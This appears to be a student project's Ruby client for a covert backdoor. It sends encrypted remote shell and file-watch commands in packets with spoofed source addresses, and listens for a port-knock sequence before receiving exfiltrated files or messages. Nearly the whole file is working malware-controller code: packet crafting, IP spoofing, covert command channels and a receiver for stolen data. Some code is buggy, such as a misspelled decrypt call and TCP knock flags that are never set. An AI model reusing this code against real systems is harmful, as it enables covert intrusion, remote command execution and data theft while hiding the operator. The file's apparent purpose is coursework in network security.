#!/usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
-- SOURCE FILE:   client.rb - Client to send commands covertly to server. Also,
--                            awaits covert knock sequence from the server to 
--                            open TCP/UDP communication for receiving of files
--                            or messages.
--
-- PROGRAM:       client
--                ./client.rb
--
-- FUNCTIONS:     libpcap packet sniffing, encryption, decryption, packet crafting,
--                covert channels, remote shell, file transfer, port knocking, 
--                shell-like input, regular expressions, file I/O
--
-- Ruby Gems req: packetfu
--                https://rubygems.org/gems/packetfu
--                fssm
--                https://rubygems.org/gems/fssm
-- 
-- DATE:          May/June 2014
--
-- REVISIONS:     See development repo: https://github.com/deuterium/comp8505-final
--
-- DESIGNERS:     Chris Wood - chriswood.ca@gmail.com
--
-- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
-- 
-- NOTES:         ** has the weird buffer issue just like the server, no idea what 
--                causes it, server needs to send multiple crafted packets before they
--                are received here
--                ** TODO: all tcp implementations
---------------------------------------------------------------------------------------
=end

require 'packetfu'
require 'openssl'
require 'readline'
require 'ipaddress'
require 'socket'
require_relative 'util.rb'

## Variables

## Application Strings
CONFIG_FILE = "client.conf"
CONFIG_FILE_DEFAULT = "\# Make sure these settings match the server settings\n"
CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# pen_port = 6886\n"
CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# exfil_port = 8668\n"
CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
CONFIG_FILE_DEFAULT << "\# target_ip = 8.8.8.8\n"
CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"
PAYLOAD_REGEX = /^(#{AUTH_STRING}) (shell|watch) .+$/
INPUT_REGEX = /^(shell|watch) .+$/

## Functions

# Starts the packet sniffing function for the client.
# Wait for the knock pattern and when received,
# starts receiving server. Knock pattern reset after.
# Implemented protocols: TCP, UDP
def listen_for_knock
  puts "starting silent listen for knock\n>"
  filter = "udp or tcp"
  begin
    cap = PacketFu::Capture.new(:iface => $cfg_iface,
        :start => true,
        :promic => true,
        :filter => filter)
      k1, k2, k3 = false, false, false #udp knock pattern flags
      k4, k5, k6 = false, false, false #tcp knock pattern flags
      config = nil #information on recv server configuration
      cap.stream.each do |p|
        pkt =  PacketFu::Packet.parse(p)
        if PacketFu::UDPPacket.can_parse?(p)
          #UDP
          if pkt.udp_dst == 44444
            k1 = true
          elsif pkt.udp_dst == 55555
            k2 = true
            config = decrypt(pkt.payload)
          elsif pkt.udp_dst == 44544
            k3 = true
          end
        elsif PacketFu::TCPPacket.can_parse?(p)
          #TCP
          if pkt.tcp_dst == 33333
            k1 = true
          elsif pkt.tcp_dst == 22222
            k2 = true
            config = decrypt(pkt.payload)
          elsif pkt.tcp_dst == 33233
            k3 = true
          end
        else
          #not implemented: other protocol sniffing
        end
        if k1 && k2 && k3
          puts "knock recv (udp)"
          k1, k2, k3 = false, false, false
          start_receiving_server(config)
        elsif k4 && k5 && k6
          puts "knock recv (tcp)"
          k4, k5, k6 = false, false, false
          start_receiving_server(config)
        else
          #not implemented: other protocol knocks
        end
      end
    rescue Exception => e
      puts "error in pkt capture"
    end
end

# Starts the receiving server to read messages 
# or receive files from the backdoor server.
# Implemented protocols: TCP, UDP
# @param [String] confing
# - csv of the configuration for the recv server
#   such as ttl, protocol, port to run on.
def start_receiving_server(config)
  payload = nil
  cfg_items = config.split(',')
  if cfg_items[0] == UDP
    recv_thread = Thread.new {
      puts "recv server started (udp)"
      socket = UDPSocket.new
      socket.bind('0.0.0.0', cfg_items[1].to_i)
      max_time = cfg_items[2].to_i
      timer = Thread.new {sleep max_time}
      loop {
        if timer.status == false #ttl has completed
          break
        end
        #check size for recv
        payload += decrpyt(socket.recv(1024))
      }
      puts "recv server ending (udp)"
    }
  elsif cfg_items[0] == TCP
    recv_thread = Thread.new {
      puts "recv server started (tcp)"
      socket = TCPSocket.new('0.0.0.0', cfg_items[1].to_i)
      max_time = cfg_items[2].to_i
      timer = Thread.new {sleep max_time}
      loop {
        if timer.status == false #ttl has completed
          break
        end
        #check size for recv
        payload += decrpyt(socket.gets)
      }
      puts "recv server ending (tcp)"
    }
  else
    #not implemented: other protocol receiving servers
  end
  puts payload
end

# Command loop for client to communcation to backdoor server.
# Two options: shell or watch
def start_command_loop
  puts "+ enter a command (2 options)"
  puts "+ shell (cmd)"
  puts "+ watch (dir|file) (path)"
  puts "+ \"ctrl + c\" to exit"
  loop {
    input = Readline.readline('> ', true)  
    if input.match(INPUT_REGEX)
      send_pkt_server_async(input.strip)
    else
      puts "Incorrect command format"
    end
  }
end

# Validates proper packet payload and directs to coresponding
# packet creation function.
# Implemented protocols: TCP, UDP
# @param [String] command
# - command to wrap in payload
def send_pkt_server_async(command)
  payload = "#{AUTH_STRING} #{command}"
  if payload.match(PAYLOAD_REGEX)
    if $cfg_pen_protocol == TCP
      tcp_packet(payload)
    elsif $cfg_pen_protocol == UDP
      udp_packet(payload)
    end
  else
    exit_reason("Error with payload validation")
  end
end

# Crafts UDP packet aimed to the values from the configuration file
# dst port = pen_port
# ip_daddr = target_ip
# src_port and ip_saddr are not important so they can be spoofed.
# Packet is then placed on the configured interface.
# @params [String] payload
# - data to send in the UDP packet
def udp_packet(payload)
  config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> $cfg_iface)).config
  udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")

  udp_pkt.udp_dst = $cfg_pen_port
  udp_pkt.udp_src = rand(0xffff)
  udp_pkt.ip_saddr = "8.8.8.8"
  #udp_pkt.ip_saddr = [rand(0xff),rand(0xff),rand(0xff),rand(0xff)].join('.')
  udp_pkt.ip_daddr = $cfg_target_ip
  udp_pkt.payload = encrypt(payload)

  udp_pkt.recalc
  udp_pkt.to_w($cfg_iface)

  puts "udp packet sent #{$cfg_target_ip} on #{$cfg_pen_port}"
end

# Crafts TCP packet aimed to the values from the configuration file
# dst port = pen_port
# ip_daddr = target_ip
# src_port and ip_saddr are not important so they can be spoofed.
# Packet is then placed on the configured interface.
# @params [String] payload
# - data to send in the TCP packet
def tcp_packet(payload)
  config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> $cfg_iface)).config
  tcp_pkt = PacketFu::TCPPacket.new(:config => config, :flavor => "Linux")

  tcp_pkt.ip_daddr = $cfg_target_ip
  tcp_pkt.tcp_dst = $cfg_pen_port
  tcp_pkt.tcp_src = rand(0xffff)
  tcp_pkt.ip_saddr = "8.8.8.8"

  tcp_pkt.tcp_flags.psh = 1
  tcp_pkt.tcp_flags.syn = 1
  tcp_pkt.payload = encrypt(payload)

  tcp_pkt.recalc
  tcp_pkt.to_w($cfg_iface)

  puts "tcp packet sent #{$cfg_target_ip} on #{$cfg_pen_port}"
end

## Main
load_config_file
validate_ip($cfg_target_ip)
puts "+ Welcome to \"not a hacking\" program"
begin
  listening_thread = Thread.new { listen_for_knock }
  start_command_loop
  listening_thread.join
rescue Interrupt
  puts "ctrl+c received"
  Thread.kill(listening_thread)
  exit 0
end
